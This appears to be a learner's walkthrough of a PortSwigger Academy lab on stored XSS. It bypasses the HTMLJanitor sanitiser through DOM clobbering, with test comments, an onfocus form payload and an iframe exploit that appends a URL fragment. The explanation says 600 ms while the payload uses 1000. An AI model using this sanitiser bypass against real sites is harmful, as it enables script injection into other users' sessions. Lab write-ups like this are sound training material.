```bash

1. Open the lab ans view a post
2. In the response header of the post, we have these interesting JavaScript files
   <script src='/resources/js/htmlJanitor.js'></script>
   <script src='/resources/js/loadCommentsWithHtmlJanitor.js'></script>

3. Carefully review the JavaScript files code

TEST 1
a. Check which HTML tags are allowed  --  <u> <a> <h1> <form> <input> <p>
b. Post a comment

RESULT 1
Only the <form> <input> <p> tag is allowed

TEST 2
<form id="apple"> <input id="mango" name="pineapple">

RESULT 2
<form id=\"apple\"> <input id=\"mango\" name=\"pineapple\">  --  both name && id is allowed

TEST 3
a. Test for event handlers  -- <form autofocus onfocus="prompt(1)"> <input autofocus onfocus="prompt()">

RESULT 3
<input>  --  Event handlers are sanitized

TEST 4
a. submit this payload and click on the back to blog button  <form id=abcd tabindex=0 onfocus=print()> <input id=attributes>
b. https://0a1a003b03af861e801e212e005e00f7.web-security-academy.net/post?postId=6#a  --  add #a at the end of the url to trigger XSS

RESULT 4
XSS confirmed

4. Copy the stored XSS page URL without the #a
5. Navigate ot the exploit server

PAYLOAD

	<iframe src="https://0a1a003b03af861e801e212e005e00f7.web-security-academy.net/post?postId=7" onload="setTimeout( ()=> this.src=this.src+'#abcd', 1000 )">


6. Navigate to the exploit server paste this payload and done


EXPLAINATION

Loads a page inside an <iframe> from the given URL (post?postId=7).

When the iframe finishes loading, the onload event fires.

setTimeout waits 600 milliseconds before running code.

After the delay, it changes the iframe’s URL by appending #abcd to it.

Adding #abcd modifies only the URL fragment (hash) — it does not reload the page from the server.

This can trigger client-side JavaScript that reads location.hash or listens for hashchange.

```
